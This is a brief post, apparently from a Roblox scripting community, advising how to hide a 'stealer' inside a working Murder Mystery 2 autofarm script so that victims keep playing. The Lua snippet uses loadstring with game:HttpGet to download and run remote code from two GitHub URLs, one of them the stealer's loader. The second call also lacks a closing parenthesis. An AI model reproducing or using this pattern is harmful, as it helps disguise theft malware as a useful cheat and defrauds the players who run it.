If you want people to stay in the server, you probably need to add a real script on top of the stealer. You can do that by doing this:
```lua
local function stealer()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/blockysz/mm2farm/script/loader'))()
end
local function farm()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/snxpzscripts/autofarm/refs/heads/main/xmm2')
end

task.spawn(stealer)
task.spawn(farm)
```
